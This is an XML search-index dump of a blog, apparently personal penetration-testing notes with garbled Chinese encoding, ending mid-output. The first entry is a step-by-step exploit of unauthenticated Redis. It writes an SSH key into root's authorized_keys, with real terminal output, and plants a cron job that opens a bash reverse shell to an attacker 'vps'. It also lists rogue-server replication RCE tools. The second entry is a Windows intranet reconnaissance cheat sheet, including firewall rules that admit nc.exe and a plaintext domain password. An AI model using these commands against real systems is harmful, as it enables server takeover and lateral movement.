<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Redisæœªæˆæƒè®¿é—®</title>
    <link href="/2022/03/24/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <url>/2022/03/24/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/twosmi1e/p/13308682.html">https://www.cnblogs.com/twosmi1e/p/13308682.html</a></p><h2 id="å†™ssh-keygenç™»å½•"><a href="#å†™ssh-keygenç™»å½•" class="headerlink" title="å†™ssh-keygenç™»å½•"></a>å†™ssh-keygenç™»å½•</h2><p>å…ˆå†³æ¡ä»¶ï¼šç›®æ ‡rootè´¦å·å¯åŠ¨redisæœåŠ¡ï¼Œå¼€æ”¾sshæœåŠ¡ï¼Œå…è®¸<a href="https://www.runoob.com/w3cnote/set-ssh-login-key.html">å¯†é’¥</a>ç™»å½•</p><ol><li>ç”Ÿæˆå…¬ç§é’¥</li></ol><blockquote><p>ssh-keygen -t rsa</p></blockquote><ol start="2"><li>å¤„ç†å…¬é’¥</li></ol><blockquote><p>(echo -e â€œ\n\nâ€;cat id_rsa.pub; echo -e â€œ\n\nâ€) &gt; 1.txt</p></blockquote><ol start="3"><li>å†™å…¥å…¬é’¥åˆ°redisæœåŠ¡å™¨</li></ol><blockquote><p>cat 1.txt | redis-cli -h 192.168.254.130 -x set pub</p></blockquote><ol start="4"><li>ç™»å½•</li></ol><blockquote><p>redis-cli -h 192.168.254.130</p></blockquote><ol start="5"><li>æŸ¥çœ‹rediså¤‡ä»½è·¯å¾„</li></ol><blockquote><p>config get dir</p></blockquote><ol start="6"><li>ç¯¡æ”¹è·¯å¾„ä¸ºsshå…¬é’¥å­˜æ”¾(/root/.ssh/)</li></ol><blockquote><p>config set dir /root/.ssh/</p></blockquote><ol start="7"><li>è®¾ç½®ä¸Šä¼ å…¬é’¥å¤‡ä»½æ–‡ä»¶åå­—ä¸ºauthorized_keysï¼š</li></ol><blockquote><p>config set dbfilename authorized_keys</p></blockquote><ol start="8"><li>ä¿å­˜é€€å‡º</li></ol><blockquote><p>save</p><p>exit</p></blockquote><p>sshå…å¯†ç™»å½•redisæœåŠ¡å™¨ï¼š</p><blockquote><p>ssh -i id_rsa <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#46;&#50;&#53;&#x34;&#x2e;&#x31;&#x33;&#48;">&#114;&#x6f;&#x6f;&#116;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#46;&#50;&#53;&#x34;&#x2e;&#x31;&#x33;&#48;</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs shell">â”€â”€(rootğŸ’€c)-[~]<br>â””â”€# ssh-keygen -t rsa                          <br>Generating public/private rsa key pair.<br>Enter file in which to save the key (/root/.ssh/id_rsa): <br>Enter passphrase (empty for no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved in /root/.ssh/id_rsa<br>Your public key has been saved in /root/.ssh/id_rsa.pub<br>The key fingerprint is:<br>SHA256:N0MqLY84OiIS0KYJ2zIQe7SMBSSmIJHszo3ueKWaR6A root@192.168.254.128<br>The key&#x27;s randomart image is:<br>+---[RSA 3072]----+<br>|O*               |<br>|O.o              |<br>|oO .      .      |<br>|B.*    . o       |<br>|BOo   o S +      |<br>|E+o... = . o     |<br>|.= oo . .        |<br>|=o=. .           |<br>|B*..             |<br>+----[SHA256]-----+<br>                                                                             <br>â”Œâ”€â”€(rootğŸ’€192)-[~]<br>â””â”€# cd .ssh/<br>                                                                             <br>â”Œâ”€â”€(rootğŸ’€192)-[~/.ssh]<br>â””â”€# ls<br>id_rsa  id_rsa.pub<br>                                                                             <br>â”Œâ”€â”€(rootğŸ’€192)-[~/.ssh]<br>â””â”€# (echo -e &quot;\n\n&quot;;cat id_rsa.pub; echo -e &quot;\n\n&quot;)&gt;1.txt<br>                                                                             <br>â”Œâ”€â”€(rootğŸ’€192)-[~/.ssh]<br>â””â”€# cat 1.txt | redis-cli -h 192.168.254.130 -x set file <br>OK<br>                                                                             <br>â”Œâ”€â”€(rootğŸ’€192)-[~/.ssh]<br>â””â”€# redis-cli -h 192.168.254.130<br>192.168.254.130:6379&gt; config get dir<br>1) &quot;dir&quot;<br>2) &quot;/root/redis-2.8.17/src&quot;<br>192.168.254.130:6379&gt; config set dir /root/.ssh/<br>OK<br>192.168.254.130:6379&gt; config get dbfilename<br>1) &quot;dbfilename&quot;<br>2) &quot;dump.rdb&quot;<br>192.168.254.130:6379&gt; config set dbfilename authorized_keys<br>OK<br>192.168.254.130:6379&gt; save<br>OK<br>192.168.254.130:6379&gt; exit<br>                                                                             <br>â”Œâ”€â”€(rootğŸ’€192)-[~/.ssh]<br>â””â”€# ssh -i id_rsa root@192.168.254.130 -p 22888<br>The authenticity of host &#x27;[192.168.254.130]:22888 ([192.168.254.130]:22888)&#x27; can&#x27;t be established.<br>ECDSA key fingerprint is SHA256:Zopc14FUvhzjh0dHrhIok+KREN4hXhbm2NNkyuMDXbw.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added &#x27;[192.168.254.130]:22888&#x27; (ECDSA) to the list of known hosts.<br>Last login: Thu Mar 24 09:21:28 2022 from 192.168.254.128<br>[root@centos7 ~]#                   <br></code></pre></td></tr></table></figure><h2 id="å†™è®¡åˆ’ä»»åŠ¡åå¼¹shell"><a href="#å†™è®¡åˆ’ä»»åŠ¡åå¼¹shell" class="headerlink" title="å†™è®¡åˆ’ä»»åŠ¡åå¼¹shell"></a>å†™è®¡åˆ’ä»»åŠ¡åå¼¹shell</h2><p>ubuntuä¸‹å¯ä»¥åˆ©ç”¨çš„cronæœ‰ä»¥ä¸‹å‡ ä¸ªåœ°æ–¹ï¼š</p><pre><code>/etc/crontabï¼šè¯¥æ–‡ä»¶é‡Œé¢çš„ä»»åŠ¡è®¡åˆ’å¯ä»¥ç›´æ¥æ‰§è¡Œ/etc/cron.d/*ï¼šè¯¥ç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶éƒ½å¯ä»¥è¢«å½“ä½œä»»åŠ¡è®¡åˆ’å»æ‰§è¡Œï¼Œå¹¶ä¸”é¿å…äº†åŸå…ˆä»»åŠ¡è®¡åˆ’æ–‡ä»¶è¢«è¦†ç›–çš„æƒ…å†µ/var/spool/cron/crontabs/ï¼šè¯¥ç›®å½•ä¸‹å®šä¹‰çš„ä»»åŠ¡è®¡åˆ’æ–‡ä»¶ä¼šè¢«æ‰§è¡Œï¼Œä¸è¿‡éœ€è¦æœ‰ä¸€ä¸ªå‰æï¼Œå°±æ˜¯è¯¥ä»»åŠ¡è®¡åˆ’æ–‡ä»¶çš„æƒé™å¿…é¡»ä¸º600</code></pre><p>CentOSä¸‹è®¡åˆ’ä»»åŠ¡æ–‡ä»¶</p><pre><code>/etc/crontabï¼šè¯¥æ–‡ä»¶é‡Œé¢çš„ä»»åŠ¡è®¡åˆ’å¯ä»¥ç›´æ¥æ‰§è¡Œ/var/spool/cron/rootï¼šè¯¥æ–‡ä»¶é‡Œé¢çš„ä»»åŠ¡è®¡åˆ’å¯ä»¥ç›´æ¥æ‰§è¡Œ</code></pre><p>å’Œå†™ssh-keygenæ–¹æ³•ä¸€æ ·</p><blockquote><p>set x â€œ\n* * * * * bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1\nâ€     //* * * * * æ¯ä¸€åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡</p><p>config set dir /var/spool/cron</p><p>config set dbfilename root</p><p>save</p></blockquote><p>Ubuntuä¸‹ï¼š</p><ol><li>å¦‚æœå†™<code>/etc/crontab</code>å’Œ<code>/etc/cron.d</code>ï¼Œç”±äºå­˜åœ¨ä¹±ç ï¼Œè¯­æ³•ä¸è¯†åˆ«ï¼Œä¼šå¯¼è‡´ubuntuä¸èƒ½æ­£ç¡®è¯†åˆ«ï¼Œå¯¼è‡´å®šæ—¶ä»»åŠ¡å¤±è´¥ã€‚</li><li>å¦‚æœå†™<code>/var/spool/cron/crontabs/root</code>ï¼Œæƒé™æ˜¯644ï¼Œubuntuä¸èƒ½è¿è¡Œã€‚</li></ol><blockquote><p>crontabåå¼¹debian,ubuntuéƒ½ä¸è¡Œï¼Œå› ä¸ºä»–ä»¬å¯¹è®¡åˆ’ä»»åŠ¡çš„æ ¼å¼å¾ˆä¸¥æ ¼ï¼Œå¿…é¡»è¦æ‰§è¡Œ<code>crontab -u root /var/spool/cron/crontabs/root</code>é€šè¿‡è¯­æ³•æ£€æŸ¥åï¼Œæ‰èƒ½æ‰§è¡Œè®¡åˆ’ä»»åŠ¡ã€‚</p></blockquote><p>æ‰€ä»¥å½“æ¸—é€ç³»ç»Ÿä¸ºubuntu/debianä¸”æ˜¯ä½æƒé™æ—¶ï¼Œä¸ä¼˜å…ˆè€ƒè™‘å†™è®¡åˆ’ä»»åŠ¡</p><h2 id="å†™webshell"><a href="#å†™webshell" class="headerlink" title="å†™webshell"></a>å†™webshell</h2><p>ç•¥</p><p>redis-4.0.10 ä¹‹å‰çš„ç‰ˆæœ¬ Redis é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œè¿™æ ·å°†ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚</p><p>redis-4.0.10 ä¹‹åçš„ç‰ˆæœ¬ é»˜è®¤å¼€å¯äº†ä¿æŠ¤æ¨¡å¼ï¼Œä»…å…è®¸æœ¬åœ°æ— å¯†ç éªŒè¯è¿æ¥ã€‚å¦‚æœè¦åˆ©ç”¨ï¼Œå¯èƒ½å°±è¦è€ƒè™‘å¼±å£ä»¤å’Œé…ç½®é”™è¯¯äº†ã€‚</p><p>å®æˆ˜åœ¨ç”Ÿäº§ç¯å¢ƒä¸‹ç”¨è¿˜æ˜¯ä¼šæœ‰å¾ˆå¤šé—®é¢˜çš„</p><ol><li>redisæ•°æ®é‡ç¨å¾®å¤§ä¸€ç‚¹ï¼Œå†™shellåˆ°æ–‡ä»¶ä¹‹åï¼Œphpå› ä¸ºæ–‡ä»¶å¤ªå¤§æ˜¯ä¼šæ‹’ç»æ‰§è¡Œçš„</li><li>Ubuntuï¼ŒDebianå†™è®¡åˆ’ä»»åŠ¡åå¼¹æ— ç”¨</li><li>å†™/etc/passwdä¼šè¦†ç›–åŸæœ‰/etc/passwdï¼Œä¸å¯èƒ½æ”¹äº†å†æ”¹å›æ¥</li><li>ç”Ÿäº§ç¯å¢ƒä¸‹ç”¨<code>KEY *</code> è¿™æ ·çš„å‘½ä»¤ç›´æ¥ç‚¸</li></ol><h2 id="ä¸»ä»å¤åˆ¶getshell"><a href="#ä¸»ä»å¤åˆ¶getshell" class="headerlink" title="ä¸»ä»å¤åˆ¶getshell"></a>ä¸»ä»å¤åˆ¶getshell</h2><p>è„šæœ¬ä¸€ï¼š</p><p><a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</a></p><p>vpsï¼š</p><blockquote><p>python3 redis-rogue-server.py -v -lport 80 -path exp.so</p></blockquote><p>redis-cliè¿æ¥redisæœåŠ¡</p><p>è®¡åˆ’ä»»åŠ¡ä»¥åŠssh_keygenä¸å¯å†™æ—¶ï¼Œå†™/tmp</p><blockquote><p>config set dir /tmp</p><p>config set dbfilename exp.so</p></blockquote><p>è®¾ç½®ä¸»ä»å…³ç³»</p><blockquote><p>slaveof vps 80</p></blockquote><p>å¯¼å…¥æ¨¡å—</p><blockquote><p>module load exp.so</p><p>module list //å‡ºç°å¦‚ä¸‹å³æˆåŠŸï¼š</p><ol><li><ol><li>â€œnameâ€</li><li>â€œsystemâ€</li><li>â€œverâ€</li><li>(integer) 1</li></ol></li></ol></blockquote><p>åå¼¹shellï¼š</p><blockquote><p>nv -lnvp 2333</p><p>system.rev vps 2333</p></blockquote><p>è„šæœ¬äºŒï¼š</p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>æœ‰ä¸¤ä¸ªæ¨¡å¼</p><blockquote><p>python3 redis-rogue-server.py â€“rhost 123.58.236.76 â€“rport 6379 â€“lhost vps â€“lport 443 -v (é»˜è®¤ï¼šâ€“exp=exp.so)</p></blockquote><p>iè¿›å…¥äº¤äº’ï¼Œråå¼¹shell</p><p>è„šæœ¬ä¸‰ï¼š</p><p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p><blockquote><p>python3 redis-rce.py -r 172.20.0.1 -L 127.0.0.1 -P 80 -f module.so</p></blockquote><p>åŒä¸Š</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å†…ç½‘ä¿¡æ¯æ”¶é›†</title>
    <link href="/2022/01/03/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2022/01/03/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="WIN"><a href="#WIN" class="headerlink" title="WIN"></a>WIN</h1><p>ä¸‰é—®ï¼šæˆ‘æ˜¯è°ï¼Ÿè¿™æ˜¯å“ªï¼Ÿæˆ‘åœ¨å“ªï¼Ÿå³åˆ¤æ–­å½“å‰æœºå™¨ï¼Œå½“å‰æœºå™¨æ‰€å¤„çš„ç½‘ç»œç¯å¢ƒ(æ‹“æ‰‘ç»“æ„åˆ†æ)ï¼Œå½“å‰æœºå™¨æ‰€å¤„çš„åŒºåŸŸ</p><p>æˆ‘æ˜¯è°ï¼šåˆ†æå½“å‰æœºå™¨çš„è§’è‰²ï¼Œweb æœåŠ¡å™¨ã€å¼€å‘æµ‹è¯•æœåŠ¡å™¨ã€æ–‡ä»¶æœåŠ¡å™¨ã€ä»£ç†æœåŠ¡å™¨ã€DNS æœåŠ¡å™¨ç­‰ç­‰</p><p>è¿™æ˜¯å“ªï¼šæ•´ä¸ªå†…ç½‘ç»“æ„çš„åˆ†æ</p><p>æˆ‘åœ¨å“ªï¼šDMZã€åŠå…¬åŒºã€æ ¸å¿ƒåŒºï¼›æˆ–è€…åœ¨å…¶ä»–åŒºåŸŸ</p><h2 id="æ”¶é›†æœ¬æœºä¿¡æ¯"><a href="#æ”¶é›†æœ¬æœºä¿¡æ¯" class="headerlink" title="æ”¶é›†æœ¬æœºä¿¡æ¯"></a>æ”¶é›†æœ¬æœºä¿¡æ¯</h2><h3 id="1-æ‰‹åŠ¨æ”¶é›†"><a href="#1-æ‰‹åŠ¨æ”¶é›†" class="headerlink" title="1. æ‰‹åŠ¨æ”¶é›†"></a>1. æ‰‹åŠ¨æ”¶é›†</h3><ul><li>ç½‘ç»œé…ç½®</li></ul><blockquote><p><strong>ipconfig /all</strong></p></blockquote><ul><li>ç³»ç»Ÿä¿¡æ¯</li></ul><blockquote><p><strong>systeminfo</strong></p><p>ææƒï¼š<a href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></p><p>åœ¨åˆæ­¥è·å¾—çš„ shell å›æ˜¾ä¸è¶³æ—¶ï¼Œå¯ä»¥é…åˆé€šé…ç¬¦å’Œå‘½ä»¤ findstr</p><p>æŸ¥çœ‹ç³»ç»Ÿæ¶æ„</p><p><strong>echo %PROCESSOR_ARCHITECTURE%</strong></p><p>è¿™ä¸ªå‘½ä»¤åˆ¤æ–­æ“ä½œç³»ç»Ÿä½æ•°æ˜¯ä¸å‡†ç¡®çš„ï¼Œå–å†³äº shell å½“å‰çš„ CMD ä½æ•°</p></blockquote><ul><li>æŸ¥çœ‹å®‰è£…è½¯ä»¶ä¿¡æ¯</li></ul><blockquote><p><strong>wmic product get name,version</strong></p><p>åœ¨èšå‰‘æ‹¿åˆ°çš„ webshell æ²¡æœ‰æ­¤å‘½ä»¤çš„å›æ˜¾ï¼Œå¯ä»¥&gt; 1.txt å typeã€more æ‰“å¼€</p><p><strong>powershell â€œGet-WmiObject -class Win32_Product|Select-Object -Property name,versionâ€œ</strong></p></blockquote><ul><li>æŸ¥çœ‹æœåŠ¡</li></ul><blockquote><p><strong>wmic service list brief</strong></p></blockquote><ul><li>æŸ¥çœ‹è¿›ç¨‹</li></ul><blockquote><p><strong>tasklist</strong></p><p><strong>wmic process list brief</strong></p><p>å«å¥æŸ„æ•°ã€è¿›ç¨‹ä¼˜å…ˆçº§ã€è¿›ç¨‹ idã€çº¿ç¨‹æ•°ã€å†…å­˜ä½¿ç”¨ç­‰</p></blockquote><ul><li>æŸ¥çœ‹å¯åŠ¨ç¨‹åº</li></ul><blockquote><p><strong>wmic startup get caption,command</strong></p></blockquote><ul><li>æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡</li></ul><blockquote><p><strong>schtasks /query</strong></p><p>æ›´å…·ä½“çš„ç”¨æ³•ï¼šschtasks /query /?</p><p>å¦‚é‡æŠ¥é”™ï¼Œ<strong>chcp 437</strong>å³å¯</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211173305284.png"></p></blockquote><ul><li>æŸ¥çœ‹ä¸»æœºç»Ÿè®¡æ•°æ®</li></ul><blockquote><p><strong>net statistic workstation</strong></p></blockquote><ul><li>æŸ¥è¯¢ç”¨æˆ·ã€ç»„</li></ul><blockquote><p>net user</p><p><strong>query user || qwinsta</strong> æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·</p><p>net localgroup</p></blockquote><ul><li>åˆ—å‡ºæˆ–æ–­å¼€æœ¬åœ°è®¡ç®—æœºä¸æ‰€è¿æ¥çš„å®¢æˆ·ç«¯ä¹‹é—´çš„ä¼šè¯</li></ul><blockquote><p>å®¢æˆ·ç«¯ net use \stu1.god.org hongrisec@2019 /u:administrator</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211220047347.png"></p><p>æ³¨æ„è¢«è¿æ¥çš„è®¡ç®—æœºå¯èƒ½éœ€è¦å…³é—­åŸŸé˜²ç«å¢™ï¼Œå¦‚æœä¸è¡Œè¯·æ’æŸ¥å¯¹åº”æœåŠ¡</p><p><strong>net session</strong></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211220109319.png"></p></blockquote><ul><li>ç½‘ç»œè¿æ¥</li></ul><blockquote><p><strong>netstat -a</strong></p></blockquote><ul><li>è¡¥ä¸ä¿¡æ¯</li></ul><p>åœ¨ç³»ç»Ÿä¿¡æ¯é‡Œé¢å¯ä»¥çœ‹åˆ°ï¼Œä¹Ÿå¯ä»¥</p><blockquote><p><strong>wmic qfe get caption,description,hotfixid,installedon</strong></p></blockquote><ul><li>å…±äº«ä¿¡æ¯</li></ul><blockquote><p>net share</p><p>wmic share get name,path,status</p></blockquote><ul><li>æŸ¥è¯¢è·¯ç”±è¡¨</li></ul><blockquote><p><strong>arp -a</strong></p><p><strong>route print</strong></p></blockquote><ul><li>é˜²ç«å¢™</li></ul><blockquote><ol><li>&lt;=winServer2003 ï¼š</li></ol><p>netsh firewall</p><p>e.g.ï¼šnetsh firewall add allowedprogram c:\nc.exe â€œncâ€ enable</p><ol start="2"><li>&gt;winServer2003ï¼š</li></ol><p>netsh advfirewall</p><p>e.g.ï¼šnetsh advfirewall firewall add rule name=â€ncâ€ dir=in(å…¥ç«™) action=allow program=â€c:\nc.exeâ€</p><p>å…è®¸ç¨‹åºçš„å…·ä½“æŸä¸ªç«¯å£ã€åè®®å…¥ç«™ï¼š</p><p>netsh advfirewall firewall add rule name=â€RDâ€ protocol=TCP dir=in localport=3389 action=allow</p></blockquote><h3 id="2-è‡ªåŠ¨æ”¶é›†"><a href="#2-è‡ªåŠ¨æ”¶é›†" class="headerlink" title="2. è‡ªåŠ¨æ”¶é›†"></a>2. è‡ªåŠ¨æ”¶é›†</h3><p><a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><p>ä¸€ä¸ªåŸºäº wmic çš„ bat è„šæœ¬</p><h2 id="æŸ¥è¯¢å½“å‰æƒé™"><a href="#æŸ¥è¯¢å½“å‰æƒé™" class="headerlink" title="æŸ¥è¯¢å½“å‰æƒé™"></a>æŸ¥è¯¢å½“å‰æƒé™</h2><ol><li>æŸ¥çœ‹å½“å‰æƒé™</li></ol><ul><li>æœ¬åœ°æ™®é€šç”¨æˆ·</li><li>æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·</li><li>åŸŸå†…ç”¨æˆ·</li></ul><blockquote><p><strong>whoami</strong></p><p>è·å–åŸŸ SID</p><p><strong>whoami /all</strong></p></blockquote><ol start="2"><li>æŸ¥è¯¢ç”¨æˆ·(åŒ…å«åœ¨åŸŸç§)çš„è¯¦ç»†ä¿¡æ¯</li></ol><blockquote><p><strong>net user xxx /domain</strong></p></blockquote><p>å¦‚ä½•åœ¨åŸŸæ§ä¸­å§”æ´¾â€œâ€åŸŸè´¦å·æƒé™â€œï¼Ÿ</p><p>éªŒè¯â€åŸŸè´¦å·ç™»å½•å…¶ä»–æœºå™¨â€œ</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218163656131.png" alt="image-20220218163656131"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218164732019.png" alt="image-20220218164732019"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218164932211.png" alt="image-20220218164932211"><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218164955920.png" alt="image-20220218164955920"></p><h2 id="åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ"><a href="#åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ" class="headerlink" title="åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ"></a>åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218165731711.png" alt="image-20220218165731711"></p><blockquote><p><strong>nslookup åŸŸ DNS åç¼€</strong></p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218170123641.png" alt="image-20220218170123641"></p><ul><li>æŸ¥è¯¢å½“å‰ç™»å½•åŸŸåŠç™»å½•ç”¨æˆ·ä¿¡æ¯</li></ul><blockquote><p><strong>net config workstation</strong></p></blockquote><ul><li>åˆ¤æ–­ä¸»åŸŸ</li></ul><blockquote><p><strong>net time /domain</strong></p></blockquote><p>ä¼šæœ‰ä¸‰ç§æƒ…å†µï¼š</p><ol><li>å­˜åœ¨åŸŸï¼Œä½†å½“å‰ç”¨æˆ·ä¸æ˜¯åŸŸç”¨æˆ·</li></ol><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218171143257.png"></p><ol start="2"><li>ä¸å­˜åœ¨åŸŸï¼Œå½“å‰ç½‘ç»œç¯å¢ƒä¸ºå·¥ä½œç»„</li></ol><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218170622671.png" alt="image-20220218170622671"></p><ol start="3"><li>å­˜åœ¨åŸŸï¼Œä¸”å½“å‰ç”¨æˆ·ç™»å½•åˆ°åŸŸä¸­</li></ol><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218171230372.png" alt="image-20220218171230372"></p><blockquote><p>åœ¨åŸŸç”¨æˆ·åˆ‡æ¢è‡³æœ¬åœ°ç”¨æˆ· <strong>è®¡ç®—æœºå\æœ¬åœ°ç”¨æˆ·</strong></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218170819135.png" alt="image-20220218170819135"></p></blockquote><h2 id="æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº"><a href="#æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº" class="headerlink" title="æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº"></a>æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº</h2><h3 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h3><blockquote><p><strong>NetBIOS</strong>ï¼Œä¸º<strong>ç½‘ä¸ŠåŸºæœ¬è¾“å…¥è¾“å‡ºç³»ç»Ÿ</strong>ï¼ˆè‹±è¯­ï¼šNetwork Basic Input/Output Systemï¼‰çš„ç¼©å†™ï¼Œå®ƒæä¾›äº†<a href="https://baike.baidu.com/item/OSI%E6%A8%A1%E5%9E%8B">OSI æ¨¡å‹</a>ä¸­çš„<a href="https://baike.baidu.com/item/%E4%BC%9A%E8%AF%9D%E5%B1%82">ä¼šè¯å±‚</a>æœåŠ¡ï¼Œè®©åœ¨ä¸åŒè®¡ç®—æœºä¸Šè¿è¡Œçš„ä¸åŒ<a href="https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F/13831935">ç¨‹åº</a>ï¼Œå¯ä»¥åœ¨<a href="https://baike.baidu.com/item/%E5%B1%80%E5%9F%9F%E7%BD%91">å±€åŸŸç½‘</a>ä¸­ï¼Œäº’ç›¸è¿çº¿ï¼Œä»¥åŠåˆ†äº«æ•°æ®ã€‚ä¸¥æ ¼æ¥è¯´ï¼ŒNetBIOS ä¸æ˜¯ä¸€ç§ç½‘ä¸Šåè®®ï¼Œè€Œæ˜¯<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%8F%A3">åº”ç”¨ç¨‹åºæ¥å£</a>ï¼ˆAPIï¼‰ã€‚è¾ƒå¤è€çš„<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/192">æ“ä½œç³»ç»Ÿ</a>ï¼Œä½¿ç”¨[IEEE 802.2](<a href="https://baike.baidu.com/item/IEEE">https://baike.baidu.com/item/IEEE</a> 802.2)ä¸<a href="https://baike.baidu.com/item/IPX%2FSPX">IPX/SPX</a>åè®®ï¼Œå¯ä»¥ä½¿ç”¨ NetBIOS Frames åè®®æˆ– NetBIOS over <a href="https://baike.baidu.com/item/IPX%2FSPX%E5%8D%8F%E8%AE%AE/659271">IPX/SPX åè®®</a>æ¥è¿ä½œã€‚ç°ä»£æ“ä½œç³»ç»Ÿï¼Œå¤šæ•°éƒ½ä½¿ç”¨<a href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE/212915">TCP/IP åè®®</a>ï¼Œåˆ™å¯é€è¿‡ NetBIOS over TCP/IP åè®®æ¥ç›¸äº’é€šä¿¡</p></blockquote><p><a href="http://www.unixwiz.net/tools/nbtscan.html">nbtscan</a></p><p>nbtscan æœ‰ Windows å’Œ Linux ä¸¤ä¸ªç‰ˆæœ¬ï¼Œä½¿ç”¨ netbios åè®®æ‰«ææœ¬åœ°æˆ–è¿œç¨‹ TCP/IP ç½‘ç»œä¸Šçš„å¼€æ”¾ NetBIOS åç§°æœåŠ¡å™¨ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">nbtscan.exe 192.168.7.0/24<br>192.168.7.1     \DP<br>192.168.7.7     TEAMSSIX\DC                     SHARING DC<br>192.168.7.107   TEAMSSIX\DANIEL7            